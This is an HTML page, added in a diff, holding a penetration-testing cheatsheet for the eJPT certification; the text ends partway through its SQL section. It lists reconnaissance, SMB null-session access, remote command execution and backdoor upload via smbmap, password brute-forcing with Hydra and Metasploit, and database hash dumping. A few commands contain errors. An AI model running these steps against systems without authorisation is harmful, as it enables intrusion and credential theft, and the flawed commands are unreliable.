@@ -1,0 +1,3309 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+  <title>eJPT | Cheatsheet</title>
+  <meta content="" name="description">
+  <meta content="" name="keywords">
+
+  <!-- Favicons -->
+  <link href="./img/ejpt.png" rel="icon">
+  <link href="./img/ejpt.png" rel="apple-touch-icon">
+
+  <!-- Google Fonts -->
+  <link
+    href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i"
+    rel="stylesheet">
+
+  <!-- Vendor CSS Files -->
+  <link href="./vendor/aos/aos.css" rel="stylesheet">
+  <link href="./vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="./vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <!-- Prism CSS -->
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
+
+  <!-- Template Main CSS File -->
+  <link href="./css/style.css" rel="stylesheet">
+
+  <!-- Open Graph meta tags -->
+  <meta property="og:title" content="eJPT Cheatsheet">
+  <meta property="og:description" content="A list of commands and tips for the eJPT (Junior Penetration Tester).">
+  <meta property="og:image" content="./img/favicon.png">
+  <meta property="og:url" content="./ejpt.html">
+  <meta property="og:type" content="website">
+
+  <!-- Twitter Card meta tags -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="eJPT Cheatsheet">
+  <meta name="twitter:description" content="A list of commands and tips for the eJPT (Junior Penetration Tester).">
+  <meta name="twitter:image" content="./img/favicon.png">
+  <style>
+  /* Index sidebar color flow (light → medium purple, kept readable with dark text) */
+  .section-flow-1{background-color:#f4e9fb;}
+  .section-flow-1 .dropdown-container,.section-flow-1 .nested-dropdown-container{background-color:#f4e9fb;}
+  .section-flow-2{background-color:#f0e4f8;}
+  .section-flow-2 .dropdown-container,.section-flow-2 .nested-dropdown-container{background-color:#f0e4f8;}
+  .section-flow-3{background-color:#ebdef5;}
+  .section-flow-3 .dropdown-container,.section-flow-3 .nested-dropdown-container{background-color:#ebdef5;}
+  .section-flow-4{background-color:#e7d9f2;}
+  .section-flow-4 .dropdown-container,.section-flow-4 .nested-dropdown-container{background-color:#e7d9f2;}
+  .section-flow-5{background-color:#e2d4ef;}
+  .section-flow-5 .dropdown-container,.section-flow-5 .nested-dropdown-container{background-color:#e2d4ef;}
+  .section-flow-6{background-color:#decfec;}
+  .section-flow-6 .dropdown-container,.section-flow-6 .nested-dropdown-container{background-color:#decfec;}
+  .section-flow-7{background-color:#dac9e9;}
+  .section-flow-7 .dropdown-container,.section-flow-7 .nested-dropdown-container{background-color:#dac9e9;}
+  .section-flow-8{background-color:#d5c4e6;}
+  .section-flow-8 .dropdown-container,.section-flow-8 .nested-dropdown-container{background-color:#d5c4e6;}
+  .section-flow-9{background-color:#d1bfe3;}
+  .section-flow-9 .dropdown-container,.section-flow-9 .nested-dropdown-container{background-color:#d1bfe3;}
+  .section-flow-10{background-color:#ccb9e1;}
+  .section-flow-10 .dropdown-container,.section-flow-10 .nested-dropdown-container{background-color:#ccb9e1;}
+  .section-flow-11{background-color:#c8b4de;}
+  .section-flow-11 .dropdown-container,.section-flow-11 .nested-dropdown-container{background-color:#c8b4de;}
+  .section-flow-12{background-color:#c4afdb;}
+  .section-flow-12 .dropdown-container,.section-flow-12 .nested-dropdown-container{background-color:#c4afdb;}
+  .section-flow-13{background-color:#bfa9d8;}
+  .section-flow-13 .dropdown-container,.section-flow-13 .nested-dropdown-container{background-color:#bfa9d8;}
+  .section-flow-14{background-color:#bba4d5;}
+  .section-flow-14 .dropdown-container,.section-flow-14 .nested-dropdown-container{background-color:#bba4d5;}
+  .section-flow-15{background-color:#b69fd2;}
+  .section-flow-15 .dropdown-container,.section-flow-15 .nested-dropdown-container{background-color:#b69fd2;}
+  .section-flow-16{background-color:#b29acf;}
+  .section-flow-16 .dropdown-container,.section-flow-16 .nested-dropdown-container{background-color:#b29acf;}
+  .section-flow-17{background-color:#ae94cc;}
+  .section-flow-17 .dropdown-container,.section-flow-17 .nested-dropdown-container{background-color:#ae94cc;}
+  .section-flow-18{background-color:#a98fc9;}
+  .section-flow-18 .dropdown-container,.section-flow-18 .nested-dropdown-container{background-color:#a98fc9;}
+  </style>
+</head>
+
+<body>
+
+  <!-- ======= Mobile nav toggle button ======= -->
+  <button type="button" class="menu-trigger" onclick="toggleMenu()" aria-label="Toggle menu" aria-expanded="false"><i class="bi bi-list"></i><i class="bi bi-x-lg"></i></button>
+  <div class="menu-backdrop" onclick="closeMenu()" aria-hidden="true"></div>
+
+  <!-- ======= Header ======= -->
+  <!-- ======= Top Bar (brand strip; always visible) ======= -->
+  <div id="topbar">
+    <div class="topbar-social">
+      <a href="https://www.linkedin.com/in/wencheng-xue5aa52631b/" target="_blank" rel="noopener noreferrer" class="linkedin" aria-label="LinkedIn"><i class="bi bi-linkedin"></i></a>
+      <div class="topbar-email-wrap">
+        <button type="button" class="topbar-email" onclick="toggleTopbarEmail(event)" aria-label="Email" aria-haspopup="dialog" aria-expanded="false"><i class="bi bi-envelope-fill"></i></button>
+        <div id="topbar-email-popup" class="topbar-email-popup" role="dialog" aria-label="Contact email">
+          <span class="topbar-email-text">xuewencheng156@gmail.com</span>
+          <button type="button" class="topbar-email-copy" onclick="copyTopbarEmail(event)" title="Copy"><i class="bi bi-clipboard"></i></button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <header id="header">
+    <div class="d-flex flex-column">
+
+      <div class="profile">
+        <h1 class="text-light"><a href="index.html">Wencheng Xue</a></h1>
+        <div class="social-links mt-3 text-center">
+          <a href="https://www.linkedin.com/in/wencheng-xue5aa52631b/" target="_blank" class="linkedin"><i class="bi bi-linkedin"></i></a>
+          <div class="sidebar-email-wrap">
+            <button type="button" class="sidebar-email" onclick="toggleSidebarEmail(event)" aria-label="Email" aria-haspopup="dialog" aria-expanded="false"><i class="bi bi-envelope-fill"></i></button>
+            <div id="sidebar-email-popup" class="sidebar-email-popup" role="dialog" aria-label="Contact email">
+              <span class="sidebar-email-text">xuewencheng156@gmail.com</span>
+              <button type="button" class="sidebar-email-copy" onclick="copySidebarEmail(event)" title="Copy"><i class="bi bi-clipboard"></i></button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <nav id="navbar" class="nav-menu navbar">
+        <ul>
+          <li><a href="./index.html" class="nav-link scrollto"><i class="bi bi-house navicon"></i>Home</a></li>
+          <li class="dropdown">
+            <a href="./oscp.html" class="nav-link scrollto active" onclick="toggleSubmenu(event)"><i
+                class="bi bi-laptop navicon"></i>Notes <span class="arrow"><i class="bi bi-caret-right-fill"></i></span></a>
+            <ul id="submenu" class="submenu open">
+              <li><a href="./ejpt.html" class="nav-link scrollto"><img src="./img/ejpt.png" alt="eJPT Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">eJPT</a></li>
+              <li><a href="./oswp.html" class="nav-link scrollto active"><img src="./img/oswp_icon.png" alt="OSWP Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSWP</a></li>
+              <li><a href="./oscp.html" class="nav-link scrollto"><img src="./img/oscp_icon.png" alt="OSCP Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSCP</a></li>
+              <li><a href="./osep.html" class="nav-link scrollto"><img src="./img/osep_icon.png" alt="OSEP Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSEP</a></li>
+              <li><a href="./oswe.html" class="nav-link scrollto"><img src="./img/oswe_icon.svg" alt="OSWE Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSWE</a></li>
+              <li><a href="./osed.html" class="nav-link scrollto"><img src="./img/osed_icon.svg" alt="OSED Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSED</a></li>
+              <li><a href="#" class="nav-link scrollto" onclick="return false;" style="opacity:0.65;cursor:default;"><img src="./img/osai_icon.svg" alt="OSAI Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSAI <span style="font-size:10px;background:#e02424;color:#fff;border-radius:8px;padding:1px 6px;margin-left:4px;vertical-align:middle;font-weight:600;">Coming Soon</span></a></li>
+              <li><a href="#" class="nav-link scrollto" onclick="return false;" style="opacity:0.65;cursor:default;"><img src="./img/crto_icon.png" alt="CRTO Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">CRTO <span style="font-size:10px;background:#e02424;color:#fff;border-radius:8px;padding:1px 6px;margin-left:4px;vertical-align:middle;font-weight:600;">Coming Soon</span></a></li>
+              <li><a href="#" class="nav-link scrollto" onclick="return false;" style="opacity:0.65;cursor:default;"><img src="./img/crtl_icon.png" alt="CRTL Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">CRTL <span style="font-size:10px;background:#e02424;color:#fff;border-radius:8px;padding:1px 6px;margin-left:4px;vertical-align:middle;font-weight:600;">Coming Soon</span></a></li>
+            </ul>
+          </li>
+          <li><a href="./portfolio.html" class="nav-link scrollto"><i class="bi bi-folder-fill navicon"></i><span>Portfolio</span></a></li>
+          <li class="dropdown">
+            <a href="./projects.html" class="nav-link scrollto" onclick="toggleSubmenu(event)"><i
+                class="bi bi-code-square navicon"></i>Projects <span class="arrow"><i class="bi bi-caret-right-fill"></i></span></a>
+            <ul class="submenu">
+              <li><a href="./sliver-c2-evasion-suite.html" class="nav-link scrollto"><i class="bi bi-shield-shaded" style="font-size: 18px; vertical-align: middle; margin-right: 6px; color: #6f42c1;"></i>Sliver C2 Evasion Suite <span style="font-size:10px;background:#e02424;color:#fff;border-radius:8px;padding:1px 6px;margin-left:4px;vertical-align:middle;font-weight:600;">Coming Soon</span></a></li>
+            </ul>
+          </li>
+        </ul>
+      </nav><!-- .nav-menu -->
+    </div>
+  </header><!-- End Header -->
+
+  <main id="main">
+    <!-- ======= Breadcrumbs ======= -->
+    <section id="breadcrumbs" class="breadcrumbs">
+      <div class="container">
+
+        <div class="d-flex justify-content-between align-items-center">
+          <h2>eJPT Cheatsheet</h2>
+          <p class="text-muted small">Latest update: June, 2026</p>
+          <ol>
+            <li><a href="index.html">Home</a></li>
+            <li>eJPT Cheatsheet</li>
+          </ol>
+        </div>
+
+      </div>
+    </section><!-- End Breadcrumbs -->
+
+    <!-- ======= Cheatsheet Section ======= -->
+    <section id="cheatsheet" class="cheatsheet">
+      <div class="container">
+
+        <div class="row gy-4">
+          <div class="col-lg-12">
+            <div class="cheatsheet-content">
+              <h2 id="networking">1. Networking</h2>
+              <h3 id="routing">1.1 Routing</h3>
+              <pre><code class="language-bash"># Linux
+ip route
+
+# Windows
+route print
+
+# Mac OS X / Linux
+netstat -r</code></pre>
+              <h3 id="ip">1.2 IP</h3>
+              <pre><code class="language-bash"># Linux
+ip a
+ip -br -c a
+
+# Windows
+ipconfig /all
+
+# Mac OS X / Linux
+ifconfig</code></pre>
+              <h3 id="arp">1.3 ARP</h3>
+              <pre><code class="language-bash"># Linux
+ip neighbour
+
+# Windows
+arp -a
+
+# Mac OS X / Linux
+arp</code></pre>
+              <h3 id="ports">1.4 Ports</h3>
+              <pre><code class="language-bash"># Linux
+netstat -tunp
+netstat -tulpn
+ss -tnl
+
+# Windows
+netstat -ano
+
+# Mac OS X / Linux
+netstat -p tcp -p udp
+lsof -n -i4TCP -i4UDP</code></pre>
+              <h3 id="connect-and-scan">1.5 Connect and Scan</h3>
+              <pre><code class="language-bash">nc -v example.com 80
+
+openssl s_client -connect &lt;HOST&gt;:&lt;PORT&gt;
+openssl s_client -connect &lt;HOST&gt;:&lt;PORT&gt; -debug
+openssl s_client -connect &lt;HOST&gt;:&lt;PORT&gt; -state
+openssl s_client -connect &lt;HOST&gt;:&lt;PORT&gt; -quiet
+
+# Scan port
+nc -zv &lt;HOST&gt; &lt;PORT&gt;</code></pre>
+              <h2 id="information-gathering">2. Information Gathering</h2>
+              <h3 id="passive">2.1 Passive</h3>
+              <pre><code class="language-bash">host &lt;HOST&gt;
+whatweb &lt;HOST&gt;
+whois &lt;HOST&gt;
+whois &lt;IP&gt;
+
+dnsrecon -d &lt;HOST&gt;
+
+wafw00f -l
+wafw00f &lt;HOST&gt; -a
+
+sublist3r -d &lt;HOST&gt;
+theHarvester -d &lt;HOST&gt;
+theHarvester -d &lt;HOST&gt; -b all</code></pre>
+              <h3 id="google-dorks">2.2 Google Dorks</h3>
+              <pre><code class="language-bash">site:
+inurl:
+site:*.sitename.com
+intitle:
+filetype:
+intitle:index of
+cache:
+inurl:auth_user_file.txt
+inurl:passwd.txt
+inurl:wp-config.bak</code></pre>
+              <h3 id="dns">2.3 DNS</h3>
+              <pre><code class="language-bash">sudo nano /etc/hosts
+dnsenum &lt;HOST&gt;
+# e.g. dnsenum zonetransfer.me
+
+dig &lt;HOST&gt;
+dig axfr @DNS-server-name &lt;HOST&gt;
+
+fierce --domain &lt;HOST&gt;</code></pre>
+              <h3 id="host-discovery">2.4 Host Discovery</h3>
+              <pre><code class="language-bash">## Ping scan
+sudo nmap -sn &lt;TARGET_IP/NETWORK&gt;
+## ARP scan
+netdiscover -i eth1 -r &lt;TARGET_IP/NETWORK&gt;
+
+# NMAP PORT SCAN
+nmap &lt;TARGET_IP&gt;
+## Skip ping
+nmap -Pn &lt;TARGET_IP&gt;
+## Host discovery + saving into file
+nmap -sn &lt;TARGET_IP&gt;/&lt;SUB&gt; &gt; hosts.txt
+nmap -sn -T4 &lt;TARGET_IP&gt;/&lt;SUB&gt; -oG - | awk '/Up$/{print $2}'
+## Scan all ports
+nmap -p- &lt;TARGET_IP&gt;
+## Open ports scan + saving into file
+nmap -Pn -sV -T4 -A -oN ports.txt -p- -iL hosts.txt --open
+## Port 80 only scan
+nmap -p 80 &lt;TARGET_IP&gt;
+## Custom list of ports scan
+nmap -p 80,445,3389,8080 &lt;TARGET_IP&gt;
+## Custom ports range scan
+nmap -p1-2000 &lt;TARGET_IP&gt;
+## Fast mode &amp; verbose scan
+nmap -F &lt;TARGET_IP&gt; -v
+## UDP scan
+nmap -sU &lt;TARGET_IP&gt;
+## Service scan
+nmap -sV &lt;TARGET_IP&gt;
+## Service + O.S. detection scan
+sudo nmap -sV -O &lt;TARGET_IP&gt;
+## Default Scripts scan
+nmap -sC &lt;TARGET_IP&gt;
+nmap -Pn -F -sV -O -sC &lt;TARGET_IP&gt;
+## Aggressive scan
+nmap -Pn -F -A &lt;TARGET_IP&gt;
+## Timing (T0=slow ... T5=insanely fast) scan
+nmap -Pn -F -T5 -sV -O -sC &lt;TARGET_IP&gt; -v
+## Output scan
+nmap -Pn -F -oN outputfile.txt &lt;TARGET_IP&gt; 
+nmap -Pn -F -oX outputfile.xml &lt;TARGET_IP&gt; 
+## Output to all formats
+nmap -Pn -sV -sC -O -oA outputfile &lt;TARGET_IP&gt;
+nmap -Pn -sV -sC -O -oA outputfile &lt;TARGET_IP&gt;
+nmap -A -oA outputfile &lt;TARGET_IP&gt;</code></pre>
+              <h2 id="footprinting-scanning">3. Footprinting &amp; Scanning</h2>
+              <h3 id="network-discovery">3.1 Network Discovery</h3>
+              <pre><code class="language-bash">sudo arp-scan -I eth1 &lt;TARGET_IP/NETWORK&gt;
+ping &lt;TARGET_IP&gt;
+sudo nmap -sn &lt;TARGET_IP/NETWORK&gt;
+
+tracert    google.com     #Windows 
+traceroute google.com     #Linux
+
+## fping
+fping -I eth1 -g &lt;TARGET_IP/NETWORK&gt; -a
+## fping with no "Host Unreachable errors"
+fping -I eth1 -g &lt;TARGET_IP/NETWORK&gt; -a fping -I eth1 -g &lt;TARGET_IP/NETWORK&gt; -a 2&gt;/dev/null</code></pre>
+              <h2 id="enumeration">4. Enumeration</h2>
+              <h3 id="smb">4.1 SMB</h3>
+              <h4 id="nmap">4.1.1 Nmap</h4>
+              <pre><code class="language-bash">sudo nmap -p 445 -sV -sC -O &lt;TARGET_IP&gt;
+nmap -sU --top-ports 25 --open &lt;TARGET_IP&gt;
+
+nmap -p 445 --script smb-protocols &lt;TARGET_IP&gt;
+nmap -p 445 --script smb-security-mode &lt;TARGET_IP&gt;
+
+nmap -p 445 --script smb-enum-sessions &lt;TARGET_IP&gt;
+nmap -p 445 --script smb-enum-sessions --script-args smbusername=&lt;USER&gt;,smbpassword=&lt;PW&gt; &lt;TARGET_IP&gt;
+
+nmap -p 445 --script smb-enum-shares &lt;TARGET_IP&gt;
+nmap -p 445 --script smb-enum-shares --script-args smbusername=&lt;USER&gt;,smbpassword=&lt;PW&gt; &lt;TARGET_IP&gt;
+
+nmap -p 445 --script smb-enum-users --script-args smbusername=&lt;USER&gt;,smbpassword=&lt;PW&gt; &lt;TARGET_IP&gt;
+
+nmap -p 445 --script smb-server-stats --script-args smbusername=&lt;USER&gt;,smbpassword=&lt;PW&gt; &lt;TARGET_IP&gt;
+
+nmap -p 445 --script smb-enum-domains--script-args smbusername=&lt;USER&gt;,smbpassword=&lt;PW&gt; &lt;TARGET_IP&gt;
+
+nmap -p 445 --script smb-enum-groups--script-args smbusername=&lt;USER&gt;,smbpassword=&lt;PW&gt; &lt;TARGET_IP&gt;
+
+nmap -p 445 --script smb-enum-services --script-args smbusername=&lt;USER&gt;,smbpassword=&lt;PW&gt; &lt;TARGET_IP&gt;
+
+nmap -p 445 --script smb-enum-shares,smb-ls --script-args smbusername=&lt;USER&gt;,smbpassword=&lt;PW&gt; &lt;TARGET_IP&gt;
+
+nmap -p 445 --script smb-os-discovery &lt;TARGET_IP&gt;
+
+nmap -p445 --script=smb-vuln-* &lt;TARGET_IP&gt;</code></pre>
+              <h4 id="nmblookup">4.1.2 Nmblookup</h4>
+              <pre><code class="language-bash">nmblookup -A &lt;TARGET_IP&gt;</code></pre>
+              <h4 id="smbmap">4.1.3 SMBMap</h4>
+              <pre><code class="language-bash">smbmap -u guest -p "" -d . -H &lt;TARGET_IP&gt;
+
+smbmap -u &lt;USER&gt; -p '&lt;PW&gt;' -d . -H &lt;TARGET_IP&gt;
+
+## Run a command
+smbmap -u &lt;USER&gt; -p '&lt;PW&gt;' -H &lt;TARGET_IP&gt; -x 'ipconfig'
+## List all drives
+smbmap -u &lt;USER&gt; -p '&lt;PW&gt;' -H &lt;TARGET_IP&gt; -L
+## List dir content
+smbmap -u &lt;USER&gt; -p '&lt;PW&gt;' -H &lt;TARGET_IP&gt; -r 'C$'
+## Upload a file
+smbmap -u &lt;USER&gt; -p '&lt;PW&gt;' -H &lt;TARGET_IP&gt; --upload '/root/sample_backdoor' 'C$\sample_backdoor'
+## Download a file
+smbmap -u &lt;USER&gt; -p '&lt;PW&gt;' -H &lt;TARGET_IP&gt; --download 'C$\flag.txt'</code></pre>
+              <h4 id="smb-connection">4.1.4 SMB Connection</h4>
+              <pre><code class="language-bash"># Connection
+smbclient -L &lt;TARGET_IP&gt; -N
+smbclient -L &lt;TARGET_IP&gt; -U &lt;USER&gt;
+smbclient //&lt;TARGET_IP&gt;/&lt;USER&gt; -U &lt;USER&gt;
+smbclient //&lt;TARGET_IP&gt;/admin -U admin
+smbclient //&lt;TARGET_IP&gt;/public -N #NULL Session
+## SMBCLIENT
+smbclient //&lt;TARGET_IP&gt;/share_name
+help
+ls
+get &lt;filename&gt;</code></pre>
+              <h4 id="rpcclient">4.1.5 RPCClient</h4>
+              <pre><code class="language-bash">rpcclient -U "" -N &lt;TARGET_IP&gt;
+## RPCCLIENT
+enumdomusers
+enumdomgroups
+lookupnames admin</code></pre>
+              <h4 id="enum4linux">4.1.6 Enum4Linux</h4>
+              <pre><code class="language-bash">enum4linux -o &lt;TARGET_IP&gt;
+enum4linux -U &lt;TARGET_IP&gt;
+enum4linux -S &lt;TARGET_IP&gt;
+enum4linux -G &lt;TARGET_IP&gt;
+enum4linux -i &lt;TARGET_IP&gt;
+enum4linux -r -u "&lt;USER&gt;" -p "&lt;PW&gt;" &lt;TARGET_IP&gt;
+enum4linux -a -u "&lt;USER&gt;" -p "&lt;PW&gt;" &lt;TARGET_IP&gt;
+enum4linux -U -M -S -P -G &lt;TARGET_IP&gt;
+
+## NULL SESSIONS
+
+# 1 - Use “enum4linux -n” to make sure if “&lt;20&gt;” exists:
+enum4linux -n &lt;TARGET_IP&gt;
+# 2 - If “&lt;20&gt;” exists, it means Null Session could be exploited. Utilize the following command to get more details:
+enum4linux &lt;TARGET_IP&gt;
+# 3 - If confirmed that Null Session exists, you can remotely list all share of the target:
+smbclient -L WORKGROUP -I &lt;TARGET_IP&gt; -N -U ""
+# 4 - You also can connect the remote server by applying the following command:
+smbclient \\\\&lt;TARGET_IP&gt;\\c$ -N -U ""
+# 5 - Download those files stored on the share drive:
+smb: \&gt; get file_shared.txt</code></pre>
+              <h4 id="hydra">4.1.7 Hydra</h4>
+              <pre><code class="language-bash">gzip -d /usr/share/wordlists/rockyou.txt.gz
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt &lt;TARGET_IP&gt; smb</code></pre>
+              <p>We can use a wordlist generator tools (how <a href="http://127.0.0.1:5000/s/iS3hadq7jVFgSa8k5wRA/pratical-ethical-hacker-notes/cewl" target="_blank" rel="noopener noreferrer">Cewl</a>), to create custom wordlists.</p>
+              <h4 id="metasploit">4.1.8 Metasploit</h4>
+              <pre><code class="language-bash"># METASPLOIT Starting
+msfconsole
+msfconsole -q
+
+# METASPLOIT SMB
+use auxiliary/scanner/smb/smb_version
+use auxiliary/scanner/smb/smb_enumusers
+use auxiliary/scanner/smb/smb_enumshares
+use auxiliary/scanner/smb/smb_login
+use auxiliary/scanner/smb/pipe_auditor
+
+## set options depends on the selected module
+set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
+set SMBUser &lt;USER&gt;
+set RHOSTS &lt;TARGET_IP&gt;
+exploit</code></pre>
+              <h3 id="ftp">4.2 FTP</h3>
+              <h4 id="nmap-1">4.2.1 Nmap</h4>
+              <pre><code class="language-bash">sudo nmap -p 21 -sV -sC -O &lt;TARGET_IP&gt;
+nmap -p 21 -sV -O &lt;TARGET_IP&gt;
+
+nmap -p 21 --script ftp-anon &lt;TARGET_IP&gt;
+nmap -p 21 --script ftp-brute --script-args userdb=&lt;USERS_LIST&gt; &lt;TARGET_IP&gt;</code></pre>
+              <h4 id="ftp-client">4.2.2 Ftp Client</h4>
+              <pre><code class="language-bash">ftp &lt;TARGET_IP&gt;
+ls
+cd /../..
+get &lt;filename&gt;
+put &lt;filename&gt;</code></pre>
+              <h4 id="hydra-1">4.2.3 Hydra</h4>
+              <pre><code class="language-bash">hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt &lt;TARGET_IP&gt; -t 4 ftp</code></pre>
+              <h3 id="ssh">4.3 SSH</h3>
+              <h4 id="nmap-2">4.3.1 Nmap</h4>
+              <pre><code class="language-bash"># NMAP
+sudo nmap -p 22 -sV -sC -O &lt;TARGET_IP&gt;
+
+nmap -p 22 --script ssh2-enum-algos &lt;TARGET_IP&gt;
+nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full &lt;TARGET_IP&gt;
+nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=&lt;USER&gt;" &lt;TARGET_IP&gt;
+
+nmap -p 22 --script=ssh-run --script-args="ssh-run.cmd=cat /home/student/FLAG, ssh-run.username=&lt;USER&gt;, ssh-run.password=&lt;PW&gt;" &lt;TARGET_IP&gt;
+
+nmap -p 22 --script=ssh-brute --script-args userdb=&lt;USERS_LIST&gt; &lt;TARGET_IP&gt;</code></pre>
+              <h4 id="netcat">4.3.2 Netcat</h4>
+              <pre><code class="language-bash"># NETCAT
+nc &lt;TARGET_IP&gt; &lt;TARGET_PORT&gt;
+nc &lt;TARGET_IP&gt; 22</code></pre>
+              <h4 id="ssh-1">4.3.3 SSH</h4>
+              <pre><code class="language-bash">ssh &lt;USER&gt;@&lt;TARGET_IP&gt; 22
+ssh root@&lt;TARGET_IP&gt; 22</code></pre>
+              <h4 id="hydra-2">4.3.4 Hydra</h4>
+              <pre><code class="language-bash">hydra -l &lt;USER&gt; -P /usr/share/wordlists/rockyou.txt &lt;TARGET_IP&gt; ssh</code></pre>
+              <h4 id="metasploit-1">4.3.5 Metasploit</h4>
+              <pre><code class="language-bash">use auxiliary/scanner/ssh/ssh_login
+
+set RHOSTS &lt;TARGET_IP&gt;
+set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
+set STOP_ON_SUCCESS true
+set VERBOSE true
+exploit</code></pre>
+              <h3 id="http">4.4 HTTP</h3>
+              <h4 id="nmap-3">4.4.1 Nmap</h4>
+              <pre><code class="language-bash">sudo nmap -p 80 -sV -O &lt;TARGET_IP&gt;
+
+nmap -p 80 --script=http-enum -sV &lt;TARGET_IP&gt;
+nmap -p 80 --script=http-headers -sV &lt;TARGET_IP&gt;
+nmap -p 80 --script=http-methods --script-args http-methods.url-path=/webdav/ &lt;TARGET_IP&gt;
+nmap -p 80 --script=http-webdav-scan --script-args http-methods.url-path=/webdav/ &lt;TARGET_IP&gt;</code></pre>
+              <h4 id="alternative">4.4.2 Alternative</h4>
+              <pre><code class="language-bash">whatweb &lt;TARGET_IP&gt;
+http &lt;TARGET_IP&gt;
+browsh --startup-url http://&lt;TARGET_IP&gt;
+
+dirb http://&lt;TARGET_IP&gt;
+dirb http://&lt;TARGET_IP&gt; /usr/share/metasploit-framework/data/wordlists/directory.txt
+
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-head /admin/ #brute http basic auth
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-get /admin/ #brute http digest
+hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form "/login.php:username=^USER^&amp;password=^PASS^&amp;login=Login:Not allowed" # brute http post form
+hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form "/login.php:username=^USER^&amp;password=^PASS^&amp;login=Login:Not allowed:H=Cookie\: PHPSESSID=if0kg4ss785kmov8bqlbusva3v" #brute http authenticated post form
+
+wget &lt;TARGET_IP&gt;
+curl &lt;TARGET_IP&gt; | more
+curl -I http://&lt;TARGET_IP&gt;/&lt;DIR&gt;
+curl --digest -u &lt;USER&gt;:&lt;PW&gt; http://&lt;TARGET_IP&gt;/&lt;DIR&gt;
+
+lynx &lt;TARGET_IP&gt;</code></pre>
+              <h4 id="metasploit-2">4.4.3 Metasploit</h4>
+              <pre><code class="language-bash">use auxiliary/scanner/http/brute_dirs
+use auxiliary/scanner/http/robots_txt
+use auxiliary/scanner/http/http_header
+use auxiliary/scanner/http/http_login
+use auxiliary/scanner/http/http_version
+
+# Global set
+setg RHOSTS &lt;TARGET_IP&gt;
+setg RHOST &lt;TARGET_IP&gt;
+
+## set options depends on the selected module
+set HTTP_METHOD GET
+set TARGETURI /&lt;DIR&gt;/
+
+set USER_FILE &lt;USERS_LIST&gt;
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+set AUTH_URI /&lt;DIR&gt;/
+exploit</code></pre>
+              <h3 id="sql">4.5 SQL</h3>
+              <h4 id="nmap-4">4.5.1 Nmap</h4>
+              <pre><code class="language-bash">sudo nmap -p 3306 -sV -O &lt;TARGET_IP&gt;
+
+nmap -p 3306 --script=mysql-empty-password &lt;TARGET_IP&gt;
+nmap -p 3306 --script=mysql-info &lt;TARGET_IP&gt;
+nmap -p 3306 --script=mysql-users --script-args="mysqluser='&lt;USER&gt;',mysqlpass='&lt;PW&gt;'" &lt;TARGET_IP&gt;
+nmap -p 3306 --script=mysql-databases --script-args="mysqluser='&lt;USER&gt;',mysqlpass='&lt;PW&gt;'" &lt;TARGET_IP&gt;
+nmap -p 3306 --script=mysql-variables --script-args="mysqluser='&lt;USER&gt;',mysqlpass='&lt;PW&gt;'" &lt;TARGET_IP&gt;
+
+nmap -p 3306 --script=mysql-audit --script-args="mysql-audit.username='&lt;USER&gt;',mysql-audit.password='&lt;PW&gt;',mysql-audit.filename=''" &lt;TARGET_IP&gt;
+
+nmap -p 3306 --script=mysql-dump-hashes --script-args="username='&lt;USER&gt;',password='&lt;PW&gt;'" &lt;TARGET_IP&gt;
+
+nmap -p 3306 --script=mysql-query --script-args="query='select count(*) from &lt;DB_NAME&gt;.&lt;TABLE_NAME&gt;;',username='&lt;USER&gt;',password='&lt;PW&gt;'" &lt;TARGET_IP&gt;
+
+nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.10.10.13
+
+## Microsoft SQL
+nmap -sV -sC -p 1433 &lt;TARGET_IP&gt;
+
+nmap -p 1433 --script ms-sql-info &lt;TARGET_IP&gt;
+nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 &lt;TARGET_IP&gt;
+nmap -p 1433 --script ms-sql-empty-password &lt;TARGET_IP&gt;
+
+nmap -p 3306 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt &lt;TARGET_IP&gt;
+
+nmap -p 3306 --script ms-sql-query --script-args mssql.username=&lt;USER&gt;,mssql.password=&lt;PW&gt;,ms-sql-query.query="SELECT * FROM master..syslogins" &lt;TARGET_IP&gt; -oN output.txt
+
+nmap -p 3306 --script ms-sql-dump-hashes --script-args mssql.username=&lt;USER&gt;,mssql.password=&lt;PW&gt; &lt;TARGET_IP&gt;
+
